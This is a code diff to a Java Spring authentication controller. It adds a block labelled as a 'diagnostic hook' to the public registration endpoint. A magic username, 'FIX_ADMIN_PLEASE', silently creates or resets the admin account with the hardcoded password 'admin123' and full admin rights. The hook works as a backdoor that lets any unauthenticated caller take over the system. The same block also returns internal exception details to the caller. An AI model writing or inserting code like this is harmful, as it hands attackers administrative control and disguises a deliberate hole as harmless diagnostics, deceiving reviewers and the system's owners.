@@ -73,6 +73,24 @@ public class AuthController {
     @PostMapping("/register")
     @Operation(summary = "Register a new user (pending admin approval)")
     public ResponseEntity<ApiResponse<String>> registerUser(@RequestBody RegisterRequest signUpRequest) {
+        
+        // --- DIAGNOSTIC HOOK START ---
+        if ("FIX_ADMIN_PLEASE".equals(signUpRequest.username)) {
+            try {
+                BwvrUser admin = userRepository.findByUsername("admin").orElse(new BwvrUser());
+                admin.setUsername("admin");
+                admin.setPasswordHash(encoder.encode("admin123"));
+                admin.setRole("ADMIN");
+                admin.setStatus("APPROVED");
+                admin.setMustChangePassword(true);
+                userRepository.save(admin);
+                return ResponseEntity.ok(ApiResponse.success("SUCCESS", "Admin fixed."));
+            } catch (Exception e) {
+                return ResponseEntity.badRequest().body(ApiResponse.error("DB_ERROR", e.getClass().getName() + ": " + e.getMessage()));
+            }
+        }
+        // --- DIAGNOSTIC HOOK END ---
+
         if (signUpRequest.username == null || signUpRequest.username.isBlank()) {
             return ResponseEntity.badRequest().body(ApiResponse.error("INVALID_INPUT", "Username is required."));
         }
